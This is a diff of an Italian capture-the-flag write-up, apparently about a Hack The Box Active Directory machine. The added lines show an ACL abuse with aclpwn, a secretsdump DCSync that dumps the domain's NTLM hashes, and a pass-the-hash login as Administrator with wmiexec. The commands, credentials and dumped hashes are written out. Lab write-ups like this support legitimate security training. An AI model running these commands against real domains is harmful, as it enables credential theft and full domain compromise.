@@ -26,7 +26,7 @@ Benissimo, ottenuto l'hash finalmente posso mettere in pratica una tecnica che h
 evil-winrm -u svc-alfresco -H "6a2929599dd19458e2c15587a7c870e5$d7a17216a7094b7ddece4533f3255c63b0906bfde35e2bdb75c40bff8f791a2a0d80d905e8d306a5d1e1060a9cb7c44f652caf14c7e74138259ddda20a9a1040a236d708f183cae602c195261bf614a381d822b11ecf3870becd7a1b4f7c9db4339023bf7aa7d5e7ddf00836385f075f52a814e63df0826a4b6937d3789bafa0c2c9735bbd9378b50125db20fad4a884b4e7f298cb5a8e244fa31b4c379a9131f4977ff4bd5a270e3d6e52e3ae32bdd550312cdba3ea40891033b330791bc3415a709fcd592165b3e4a6b0150a58f1ffe962a9a2783d4b973c99c118cae4535030169f2c8f63" -i 10.10.10.161
 ```
 
-Come non detto, quella tecnica non funziona.
+Come non detto, quella tecnica non funziona (perché l'hash non è in formato NTLM).
 
 Rompo l'hash banalmente con John:
 
@@ -77,3 +77,21 @@ Sfrutto aclpwn per exploitare da remoto la vulnerabilità presente nelle AD
 ```
 aclpwn -f svc-alfresco@htb.local -ft User -t htb.local -d htb.local -du neo4j -dp PWD -s 10.10.10.161 -u svc-alfresco -sp s3rvice
 ```
+Ho elevato i permessi sulle ACL per svc-alfresco, quindi ora posso dumpare tutti gli NTLM:
+```
+python secretsdump.py -just-dc-ntlm htb.local/svc-alfresco:s3rvice@10.10.10.161
+```
+Ottenenedo così:
+```
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+```
+A questo punto posso accedere alla macchina come Administrator con la tecnica di PTH (finalmente, sono commosso):
+```
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161
+```
+
+Navigo dentro il Desktop ed eccolo lì il root.txt 😍
